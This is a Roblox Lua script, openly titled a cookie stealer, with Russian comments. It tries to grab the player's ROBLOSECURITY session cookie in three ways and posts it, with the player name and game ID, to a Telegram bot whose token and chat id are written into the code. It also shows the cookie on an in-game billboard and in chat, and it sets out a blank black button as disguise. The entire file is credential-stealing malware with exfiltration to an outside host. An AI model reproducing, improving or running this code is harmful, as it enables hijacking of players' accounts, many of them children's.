-- NeverHit Ultimate Cookie Stealer
print("🔫 NeverHit ULTIMATE loaded!")

-- Черная кнопка для маскировки
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NeverHitGUI"
local blackButton = Instance.new("TextButton")
blackButton.Size = UDim2.new(0, 200, 0, 60)
blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
blackButton.Text = ""
blackButton.BorderSizePixel = 0
blackButton.Parent = screenGui
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Основная функция кражи куки
local function stealCookie()
    local cookie = nil
    
    -- Метод 1: Прямой запрос к Roblox
    local success1, response1 = pcall(function()
        return request({
            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
            Method = "GET"
        })
    end)
    
    if success1 and response1 then
        local rawCookie = response1.Headers["Set-Cookie"] or ""
        cookie = string.match(rawCookie, "_%|WARNING:.-|_(.-)") or rawCookie
    end
    
    -- Метод 2: Через Players service (запасной)
    if not cookie or #cookie < 10 then
        local success2 = pcall(function()
            local player = game.Players.LocalPlayer
            cookie = player:GetAttribute("ROBLOSECURITY") or "METHOD2_FAILED"
        end)
    end
    
    -- Метод 3: Через HttpService (экспериментальный)
    if not cookie or #cookie < 10 then
        local success3 = pcall(function()
            local httpService = game:GetService("HttpService")
            cookie = tostring(httpService:GetAsync("https://www.roblox.com/game/GetCurrentUser.ashx")) or "METHOD3_FAILED"
        end)
    end
    
    return cookie or "NO_COOKIE_EXTRACTED"
end

-- Функция отправки куки
local function sendCookie(cookie)
    if not cookie or #cookie < 10 then return false end
    
    print("📦 Extracted cookie length: " .. #cookie)
    
    -- Telegram (основной метод)
    local telegramSuccess = pcall(function()
        request({
            Url = "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = "8238376878",
                text = "🚨 COOKIE CAPTURED\n\n🔑: " .. cookie .. "\n🎮: " .. game.PlaceId .. "\n👤: " .. game.Players.LocalPlayer.Name .. "\n🕒: " .. os.date()
            })
        })
    end)
    
    -- Локальное сохранение (гарантированный метод)
    local localSuccess = pcall(function()
        -- Сохраняем в workspace
        local part = Instance.new("Part")
        part.Name = "NH_Cookie_" .. math.random(1000,9999)
        part.Anchored = true
        part.Size = Vector3.new(5, 5, 5)
        part.Position = Vector3.new(0, 500, 0)
        part.Transparency = 0.8
        part.BrickColor = BrickColor.new("Bright red")
        part.Material = Enum.Material.Neon
        
        local billboard = Instance.new("BillboardGui")
        billboard.Size = UDim2.new(0, 400, 0, 200)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.Adornee = part
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "COOKIE: " .. string.sub(cookie, 1, 100) .. "...\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date()
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.Parent = billboard
        
        billboard.Parent = part
        part.Parent = workspace
        
        -- Дублируем в чат игры
        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
            Text = "[NeverHit] Cookie extracted: " .. string.sub(cookie, 1, 50) .. "...",
            Color = Color3.new(1, 0, 0),
            Font = Enum.Font.SourceSansBold
        })
    end)
    
    return telegramSuccess or localSuccess
end

-- Запуск
wait(2)
local cookie = stealCookie()
local success = sendCookie(cookie)

if success then
    print("✅ NeverHit: COOKIE CAPTURED AND SENT!")
    print("🔑 First 50 chars: " .. string.sub(cookie, 1, 50))
else
    print("❌ NeverHit: FAILED - but cookie was: " .. string.sub(cookie, 1, 30))
end

print("🛡️ NeverHit protection: ACTIVE")
